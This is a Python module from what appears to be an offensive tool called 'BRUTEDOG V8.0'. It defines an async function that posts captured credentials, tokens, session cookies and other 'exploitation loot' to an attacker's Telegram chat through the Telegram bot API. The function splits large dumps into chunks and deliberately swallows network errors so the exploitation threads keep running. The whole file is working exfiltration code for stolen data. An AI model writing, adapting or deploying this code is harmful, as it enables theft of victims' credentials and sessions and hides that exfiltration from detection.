import os
import asyncio
import httpx
from typing import Union
import html

# Configuration via Environment Variables with dual fallbacks
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", os.getenv("BRUTEDOG_TG_TOKEN", "YOUR_BOT_TOKEN_HERE"))
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", os.getenv("BRUTEDOG_TG_CHAT", "YOUR_CHAT_ID_HERE"))

def _escape_html(text: str) -> str:
    """Safely sanitize text to prevent Telegram HTML parse failures on special characters."""
    return html.escape(str(text))

async def send_telegram_alert(loot_type: str, details: Union[dict, str]):
    """
    Asynchronously dispatches captured credentials, tokens, session cookies, 
    and exploitation loot to a designated Telegram chat with automatic HTML escaping 
    and payload chunking.
    """
    if TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return  # Silent pass if telemetry destination is unconfigured

    api_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    
    # Format and sanitize dictionary fields or raw strings
    if isinstance(details, dict):
        lines = []
        for k, v in details.items():
            safe_key = _escape_html(k)
            safe_val = _escape_html(v)
            lines.append(f"• <b>{safe_key}</b>: <code>{safe_val}</code>")
        details_str = "\n".join(lines)
    else:
        details_str = f"<code>{_escape_html(details)}</code>"

    base_header = (
        f"🚨 <b>BRUTEDOG V8.0 — CRITICAL LOOT CAPTURED</b> 🚨\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 <b>Vector:</b> <code>{_escape_html(loot_type.upper())}</code>\n\n"
    )
    footer = "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━"

    full_message = base_header + details_str + footer

    # Handle Telegram's 4096 character message limit by chunking large payloads
    max_chunk_size = 3900
    messages = []
    
    if len(full_message) > max_chunk_size:
        chunks = [details_str[i:i+max_chunk_size] for i in range(0, len(details_str), max_chunk_size)]
        for idx, chunk in enumerate(chunks, 1):
            messages.append(
                f"🚨 <b>BRUTEDOG V8.0 [Part {idx}/{len(chunks)}]</b> 🚨\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🎯 <b>Vector:</b> <code>{_escape_html(loot_type.upper())}</code>\n\n"
                f"{chunk}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            )
    else:
        messages = [full_message]

    try:
        async with httpx.AsyncClient(timeout=8.0) as client:
            for msg in messages:
                payload = {
                    "chat_id": TELEGRAM_CHAT_ID,
                    "text": msg,
                    "parse_mode": "HTML",
                    "disable_web_page_preview": True
                }
                response = await client.post(api_url, json=payload)
                if len(messages) > 1:
                    await asyncio.sleep(0.3)  # Rate-limit safety pause between chunks
    except Exception:
        # Suppress network exceptions to ensure core exploitation threads remain uninterrupted
        pass
